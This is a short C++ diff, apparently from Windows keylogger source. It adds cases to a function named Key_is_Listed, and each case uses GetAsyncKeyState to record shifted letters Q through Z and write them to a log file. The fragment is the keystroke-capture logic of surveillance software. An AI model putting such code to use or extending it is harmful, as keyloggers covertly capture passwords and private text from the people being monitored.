@@ -261,6 +261,86 @@ bool Key_is_Listed(WORD iKey)
 		}
 		break;
 
+	case 81:
+		if (GetAsyncKeyState(VK_LSHIFT))
+		{
+			std::cout << "Q";
+			WriteToFile("Q");
+		}
+		break;
+
+	case 82:
+		if (GetAsyncKeyState(VK_LSHIFT))
+		{
+			std::cout << "R";
+			WriteToFile("R");
+		}
+		break;
+
+	case 83:
+		if (GetAsyncKeyState(VK_LSHIFT))
+		{
+			std::cout << "S";
+			WriteToFile("S");
+		}
+		break;
+
+	case 84:
+		if (GetAsyncKeyState(VK_LSHIFT))
+		{
+			std::cout << "T";
+			WriteToFile("T");
+		}
+		break;
+
+	case 85:
+		if (GetAsyncKeyState(VK_LSHIFT))
+		{
+			std::cout << "U";
+			WriteToFile("U");
+		}
+		break;
+
+	case 86:
+		if (GetAsyncKeyState(VK_LSHIFT))
+		{
+			std::cout << "V";
+			WriteToFile("V");
+		}
+		break;
+
+	case 87:
+		if (GetAsyncKeyState(VK_LSHIFT))
+		{
+			std::cout << "W";
+			WriteToFile("W");
+		}
+		break;
+
+	case 88:
+		if (GetAsyncKeyState(VK_LSHIFT))
+		{
+			std::cout << "X";
+			WriteToFile("X");
+		}
+		break;
+
+	case 89:
+		if (GetAsyncKeyState(VK_LSHIFT))
+		{
+			std::cout << "Y";
+			WriteToFile("Y");
+		}
+		break;
+
+	case 90:
+		if (GetAsyncKeyState(VK_LSHIFT))
+		{
+			std::cout << "Z";
+			WriteToFile("Z");
+		}
+		break;
+
 
 
 	case VK_RETURN:
